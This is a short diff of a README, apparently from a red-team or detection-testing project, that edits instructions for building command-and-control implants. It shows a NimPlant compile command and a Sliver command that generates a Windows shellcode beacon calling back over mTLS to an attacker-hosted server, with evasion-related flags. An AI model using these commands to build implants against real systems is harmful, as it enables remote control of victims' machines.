@@ -81,7 +81,7 @@ To be able to capture the response of these executables, I used two C2 servers, 
 ```
 python NimPlant.py compile
 ```
-While, to generate such a file from Sliver, execute:
+While, to generate such a file from Sliver, change the "IP" to the IP address of the hosted Sliver server and execute:
 ```
 generate beacon --mtls IP --os windows --disable-sgn -f shellcode --skip-symbols --timeout 10
 ```
